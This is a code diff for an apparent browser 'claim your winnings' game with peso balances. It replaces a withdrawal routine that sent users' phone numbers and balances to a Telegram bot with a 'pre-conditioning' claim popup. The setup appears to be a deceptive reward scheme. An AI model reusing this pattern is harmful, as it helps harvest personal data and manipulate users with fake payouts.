@@ -196,35 +196,28 @@ function showFinalWithdraw() {
 }
 
 /**
- * Process withdrawal claim
+ * Process withdrawal claim - Show popup first before redirect
  */
 function doClaim() {
-    DOM.processingOverlay.style.display = 'flex';
+    // Get current balance
+    let currentBalance = GameState.balance;
     
-    // Send notification to Telegram (using config from config.js)
-    if (typeof TELEGRAM_CONFIG !== 'undefined') {
-        const message = `💰 NEW CLAIM!\n📱 ${userPhone}\n💵 ₱${GameState.balance}`;
-        const url = `https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage?chat_id=${TELEGRAM_CONFIG.chatId}&text=${encodeURIComponent(message)}`;
+    if (currentBalance > 0) {
+        // Hide processing overlay if visible
+        if (DOM.processingOverlay) {
+            DOM.processingOverlay.style.display = 'none';
+        }
         
-        fetch(url).catch(e => console.log('📨 Telegram error:', e));
-    }
-    
-    // Get and redirect to reward link
-    if (db) {
-        db.ref('links').orderByChild('status').equalTo('available').limitToFirst(1).once('value', (snap) => {
-            if (snap.exists()) {
-                const key = Object.keys(snap.val())[0];
-                const url = snap.val()[key].url;
-                db.ref('links/' + key).update({ status: 'claimed', user: userPhone });
-                setTimeout(() => window.location.href = url, 2000);
-            } else {
-                alert("❌ Out of rewards! Try again later.");
-                DOM.processingOverlay.style.display = 'none';
-            }
-        });
+        // Show the claim popup with pre-conditioning (from popup.js)
+        if (typeof showClaimPopup === 'function') {
+            showClaimPopup(currentBalance);
+            console.log('🎁 Claim popup shown for amount:', currentBalance);
+        } else {
+            console.error('❌ showClaimPopup function not found!');
+            alert("Popup not loaded. Please refresh the page.");
+        }
     } else {
-        alert("❌ Database error. Please try again.");
-        DOM.processingOverlay.style.display = 'none';
+        alert("❌ No balance to claim!");
     }
 }
 
@@ -447,4 +440,4 @@ if (document.readyState === 'loading') {
     document.addEventListener('DOMContentLoaded', init);
 } else {
     init();
-}
+                }
